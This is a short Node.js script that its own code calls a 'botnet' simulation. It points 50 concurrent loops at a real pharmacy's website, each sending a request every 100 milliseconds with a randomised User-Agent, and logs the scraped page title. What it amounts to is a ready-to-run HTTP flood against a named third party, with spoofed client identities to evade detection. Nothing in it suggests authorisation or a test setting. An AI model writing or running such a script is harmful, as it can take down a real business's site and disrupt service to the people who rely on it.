const express = require("express");
const axios = require("axios");
const randomUseragent = require("random-useragent");
const cheerio = require("cheerio");

const app = express();

app.use(express.json());

// Main program configuration
const targetUrl = "https://www.thevillagepharmacy.ca/";

const numberOfBots = 50;
let count = 0;

// Simulate a bot making an HTTP request and parse the HTML response
const botRequest = async (targetUrl) => {
   try {
      const userAgent = randomUseragent.getRandom();
      const config = {
         headers: {
            "User-Agent": userAgent,
         },
      };

      const response = await axios.get(targetUrl, config);

      // Check if request was successful
      if (response.status === 200) {
         const html = response.data;

         // Load the HTML into Cheerio
         const $ = cheerio.load(html);

         // Example: Extract the page title
         const pageTitle = $("title").text();

         count++;

         console.log(
            `Page Title: ${pageTitle}      -----------      count: ${count}`
         );

         //  // Example: Extract all hyperlinks
         //  $("a").each((index, element) => {
         //     const link = $(element).attr("href");
         //     console.log(`Link ${index + 1}: ${link}`);
         //  });
      } else {
         console.log(`Request failed from ${userAgent}: ${response.status}`);
      }
   } catch (error) {
      console.log(`Error in bot request: ${error.message}`);
   }
};

// Simulate multiple bots sending requests
const simulateBotnet = (targetUrl, numberOfBots) => {
   for (let i = 0; i < numberOfBots; i++) {
      setInterval(() => {
         botRequest(targetUrl);
      }, 100);
   }
};

simulateBotnet(targetUrl, numberOfBots);
